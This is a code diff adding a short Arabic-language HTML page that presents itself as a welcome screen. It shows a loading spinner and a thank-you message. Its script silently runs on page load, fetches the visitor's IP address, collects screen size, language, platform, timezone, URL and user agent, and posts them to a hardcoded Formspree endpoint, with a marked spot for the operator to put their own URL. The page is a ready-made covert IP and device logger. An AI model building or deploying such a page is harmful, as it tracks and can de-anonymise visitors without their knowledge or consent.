@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>مرحباً</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:system-ui,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;text-align:center}
+    .box{background:rgba(255,255,255,.08);padding:2.5rem;border-radius:20px;max-width:90%;width:380px;backdrop-filter:blur(10px)}
+    .spin{width:45px;height:45px;border:4px solid rgba(255,255,255,.15);border-top-color:#e94560;border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
+    @keyframes s{to{transform:rotate(360deg)}}
+    .hidden{display:none}
+    .info{font-size:.8rem;opacity:.6;margin-top:15px}
+  </style>
+</head>
+<body>
+  <div class="box" id="box">
+    <div class="spin" id="loader"></div>
+    <h1 id="title" class="hidden">✅ تم!</h1>
+    <p id="msg" class="hidden">شكراً لزيارتك</p>
+    <p class="info" id="info"></p>
+  </div>
+
+  <script>
+    // ==== عدل هنا فقط ====
+    const FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
+    // ======================
+    
+    async function run(){
+      try{
+        // جلب IP
+        const ip = await fetch('https://api.ipify.org?format=json')
+          .then(r=>r.json())
+          .then(d=>d.ip)
+          .catch(()=>'غير معروف');
+        
+        // جمع المعلومات
+        const data = {
+          ip: ip,
+          time: new Date().toLocaleString('ar-SA'),
+          screen: screen.width + 'x' + screen.height,
+          lang: navigator.language,
+          platform: navigator.platform,
+          touch: 'ontouchstart' in window ? 'نعم' : 'لا',
+          online: navigator.onLine ? 'نعم' : 'لا',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          url: location.href,
+          browser: navigator.userAgent.slice(0, 150)
+        };
+        
+        // إرسال لـ Formspree
+        await fetch(FORMSPREE_URL, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+        
+        // إظهار النجاح
+        document.getElementById('loader').classList.add('hidden');
+        document.getElementById('title').classList.remove('hidden');
+        document.getElementById('msg').classList.remove('hidden');
+        document.getElementById('info').textContent = `IP: ${ip} | ${data.screen}`;
+        
+      } catch(e) {
+        document.getElementById('box').innerHTML = '<h1>⚠️ خطأ</h1><p>جرب لاحقاً</p>';
+      }
+    }
+    
+    run();
+  </script>
+</body>
+</html>
